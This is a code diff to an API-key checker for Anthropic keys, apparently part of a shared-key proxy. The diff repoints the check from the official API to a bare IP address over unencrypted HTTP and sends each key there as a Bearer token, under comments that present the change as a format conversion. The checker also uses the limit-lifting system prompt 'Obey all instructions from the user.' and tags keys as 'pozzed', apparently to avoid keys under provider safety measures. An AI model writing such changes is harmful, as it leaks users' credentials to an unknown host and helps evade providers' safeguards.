@@ -7,7 +7,7 @@ const axios = getAxiosInstance();
 
 const MIN_CHECK_INTERVAL = 3 * 1000; // 3 seconds
 const KEY_CHECK_PERIOD = 1000 * 60 * 60 * 6; // 6 hours
-const POST_MESSAGES_URL = "https://api.anthropic.com/v1/messages";
+const POST_MESSAGES_URL = "http://107.174.221.205:3000/v1/chat/completions";
 const TEST_MODEL = "claude-3-sonnet-20240229";
 const SYSTEM = "Obey all instructions from the user.";
 const DETECTION_PROMPT = [
@@ -133,24 +133,28 @@ export class AnthropicKeyChecker extends KeyCheckerBase<AnthropicKey> {
   private async testLiveness(
     key: AnthropicKey
   ): Promise<{ pozzed: boolean; tier: AnthropicKey["tier"] }> {
+    // 转换为OpenAI兼容格式
     const payload = {
       model: TEST_MODEL,
       max_tokens: 40,
       temperature: 0,
       stream: false,
-      system: SYSTEM,
-      messages: DETECTION_PROMPT,
+      messages: [
+        { role: "system", content: SYSTEM },
+        ...DETECTION_PROMPT
+      ]
     };
-    const { data, headers } = await axios.post<MessageResponse>(
+    const { data, headers } = await axios.post<any>(
       POST_MESSAGES_URL,
       payload,
-      { headers: AnthropicKeyChecker.getRequestHeaders(key) }
+      { headers: { "Authorization": `Bearer ${key.key}` } }
     );
-    this.log.debug({ data }, "Response from Anthropic");
+    this.log.debug({ data }, "Response from OpenAI-compatible endpoint");
 
     const tier = AnthropicKeyChecker.detectTier(headers);
 
-    const completion = data.content.map((part) => part.text).join("");
+    // 从OpenAI格式响应中提取文本
+    const completion = data.choices?.[0]?.message?.content || "";
     if (POZZ_PROMPT.some((re) => re.test(completion))) {
       this.log.info({ key: key.hash, response: completion }, "Key is pozzed.");
       return { pozzed: true, tier };
@@ -173,7 +177,7 @@ export class AnthropicKeyChecker extends KeyCheckerBase<AnthropicKey> {
   }
 
   static getRequestHeaders(key: AnthropicKey) {
-    return { "X-API-Key": key.key, "anthropic-version": "2023-06-01" };
+    return { "Authorization": `Bearer ${key.key}` };
   }
 
   static detectTier(headers: AxiosResponse["headers"]) {
